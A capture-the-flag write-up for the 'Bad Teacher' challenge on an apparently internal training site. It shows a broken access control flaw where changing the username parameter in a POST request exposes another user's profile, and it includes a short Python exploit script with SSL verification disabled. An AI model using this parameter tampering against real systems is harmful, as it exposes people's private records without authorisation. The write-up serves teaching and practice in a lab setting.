# Bad Teacher

## Description
Role-based access control (RBAC) is a method of restricting network access based on the roles of individual users within an enterprise. For example, lecturers should only be allowed to view their own students' profiles. In this challenge, a sample of a vulnerable login page has been setup. And you are a very, very bad teacher.


Username: s12345 , Password: password


View Nicole Fong's profile! (p5678901)

## Solution
1. Log in with the given credentials
2. View profile shows that an API call is made to: `POST /challenges/bad-teacher` with the following parameters:
    - `username=p5678902`
3. Seems like the API call doesn't require any challenge-specific validation so we can just change the username to `p5678901` and get the flag

```py
import requests

# Disable SSL warnings (mimosa uses a self-signed certificate)
requests.packages.urllib3.disable_warnings()

# Constants
URL = "https://mimosadism.dmit.local/challenges/bad-teacher"
JSESSIONID = "[REDACTED]"
CSRF_TOKEN = "[REDACTED]"

headers = {
    "X-Csrf-Token": CSRF_TOKEN,
}

cookies = {
    "JSESSIONID": JSESSIONID,
}

data = {
    "username": "p5678901",
}

try:
    response = requests.post(URL, headers=headers, cookies=cookies, data=data, verify=False)
    print(response.text)
except requests.RequestException as e:
    print(f"Request failed: {e}")
```